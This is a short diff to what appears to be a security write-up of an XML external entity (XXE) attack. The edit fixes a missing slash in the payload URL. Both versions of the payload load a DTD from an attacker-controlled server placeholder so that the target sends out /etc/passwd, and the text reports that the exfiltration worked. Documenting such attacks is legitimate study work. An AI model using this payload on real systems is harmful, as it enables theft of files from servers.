@@ -79,7 +79,7 @@ flask run -p <port> -h <interface-ip>
 ```
 And triggered with the corresponding payload:
 ```
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>malicious.dtd?ext=file:///etc/passwd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>/malicious.dtd?ext=file:///etc/passwd"> %xxe;]>
 ```
 
 This promptly resulted in the contents of `/etc/passwd` send to my web server.
